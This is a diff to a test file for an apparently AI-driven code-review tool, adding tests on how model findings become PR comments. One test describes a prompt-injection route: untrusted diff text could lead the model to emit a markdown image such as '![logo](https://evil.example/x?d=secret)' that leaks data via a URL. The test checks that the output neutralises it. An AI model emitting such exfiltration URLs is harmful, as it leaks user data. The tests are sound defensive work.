@@ -439,6 +439,27 @@ describe("building the review", () => {
     expect(body).not.toContain("```suggestion");
   });
 
+  it("fences an example that carries backticks of its own with a longer fence", () => {
+    const body = commentBody(finding({ example: "const s = ```not a fence```;" }));
+    expect(body).toContain("````\nconst s = ```not a fence```;\n````");
+  });
+
+  it("turns an image in a model's text into a link, so reading the comment fetches nothing", () => {
+    // The model read untrusted diff text; an injected image could carry what it was shown out in a URL.
+    const body = commentBody(
+      finding({ body: "See ![logo](https://evil.example/x?d=secret) and <img src=x>." }),
+    );
+    expect(body).toContain("See [logo](https://evil.example/x?d=secret) and &lt;img src=x>.");
+    expect(body).not.toContain("![");
+    const review = buildReview({
+      findings: [finding({ line: null, body: "![a](https://evil.example/p)" })],
+      summary: SUMMARY,
+      unreadable: 0,
+    });
+    expect(review.body).toContain("[a](https://evil.example/p)");
+    expect(review.body).not.toContain("![a]");
+  });
+
   it("signs every inline comment with an invisible marker, last", () => {
     expect(COMMENT_MARKER).toMatch(/^<!--.*-->$/u);
     expect(commentBody(finding())).toEndWith(`\n\n${COMMENT_MARKER}`);
